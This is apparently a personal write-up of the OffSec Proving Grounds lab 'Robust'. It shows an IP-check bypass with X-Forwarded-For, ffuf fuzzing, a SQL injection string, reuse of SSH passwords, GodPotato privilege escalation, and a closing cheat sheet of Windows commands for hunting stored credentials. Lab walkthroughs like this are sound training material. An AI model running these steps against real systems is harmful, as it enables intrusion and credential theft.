---
title: Robust
date: 2026-01-27T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - proving-grounds
  - web
  - file-upload
  - match-and-replace
  - Caido
  - godpotato
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Robust"
---

`nmap 192.168.185.200`

![](Screenshot%202025-12-23%20at%2007.14.46.png)

We have found a login page and a port with Pando-pup(7680)

Initially when we connect to the http server the we get this response. 

![](Screenshot%202025-12-23%20at%2007.30.45.png)

So we need to insert a header forwarder : `X-Forwarded-For: 10.10.10.3`

![](Screenshot%202025-12-23%20at%2007.32.08.png)


![](Screenshot%202025-12-23%20at%2007.29.33.png)

I need to fuzz this but we need to insert the forwarder. 

` ffuf -u http://192.168.185.200:80/FUZZ.php -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 -H "X-Forwarded-For:10.10.10.3" -fw 1`
The -fw 1 is important...

Don't use -recursion

![](Screenshot%202025-12-23%20at%2008.06.28.png)

This took a while to figure out and my be a good Caido tutorial. 

Match and Replace Rules

This took many attempts and there is no thorough documentation on these rules. 

Having said that, once you figure it out its incredibly handy.  

Create a rule, the tick box will enable it across all of your new request/responses. 
For this one I need to add a header. Select the *Request header*, then *Add*, under value put your string. The colon will autofill. 

![](Screenshot%202025-12-23%20at%2009.11.32.png)

It will now be automatically "Editing" all of the traffic. You can also select to see the original as well. 
 
![](Screenshot%202025-12-23%20at%2009.18.14.png)

With the second rule where we need to  remove a header, you'll notice that when you test the rule its not working, but it does work.

![](Screenshot%202025-12-23%20at%2009.33.53.png)

Notice the difference between the original and the Automated edit!

![](Screenshot%202025-12-23%20at%2009.36.41.png)

![](Screenshot%202025-12-23%20at%2009.37.07.png)

![](Screenshot%202025-12-23%20at%2009.09.04.png)

I tried to login to the site, with no success

![](Screenshot%202025-12-23%20at%2009.38.48.png)

Once I could finally use match and replace I was able to see the /home.php page.

There is a search input field that would take a SQL injection `'UNION SELECT * FROM Employees'`

![](Screenshot%202025-12-23%20at%2009.42.44.png)

![](Screenshot%202025-12-23%20at%2009.39.22.png)

So I tried ssh:

![](Screenshot%202025-12-23%20at%2009.40.05.png)

pass:Mathsisfun123

![](Screenshot%202025-12-23%20at%2009.38.16.png)


Kali:

`scp GodPotato-NET4.exe  Jeff@192.168.185.200:/C:/Users/Jeff/Desktop `

Victim machine: 

`.\GodPotato-NET4.exe- cmd "cmd /c whoami"`

![](Screenshot%202025-12-23%20at%2012.55.52.png)

After hours of failed enumeration I looked up the answer.

There is a file with credentials:

`type C:\Users\Jeff\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite

![](Screenshot%202026-01-18%20at%2008.47.16%201.png)


ssh into the machine and look for the proof.txt file:

`ssh administrator@192.168.183.200`

`MySupersecurePassword2112`

Sticky Notes

`%LocalAppData%\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`

PowerShell History

`%AppData%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

IIS Web Configs

`C:\inetpub\wwwroot\web.config`

Unattend Files

`C:\Windows\Panther\Unattend.xml`

Search for passwords in the registry reg query 

`HKLM /f password /t REG_SZ /s reg query`

`HKCU /f password /t REG_SZ /s`

Check History: 

`type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

Check App Databases: Search for .db and .sqlite files in 

`%LocalAppData%\Packages.`

Search Registry for Autologon: 

`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword`

Search File Contents: grep or findstr for "password", "admin", or "creds" in the Users directories.

`findstr /si password *.txt *.xml *.ini *.config`

`findstr /si credentials *.txt *.xml *.ini *.config`

`findstr /si administrator *.txt *.xml *.ini *.config`
	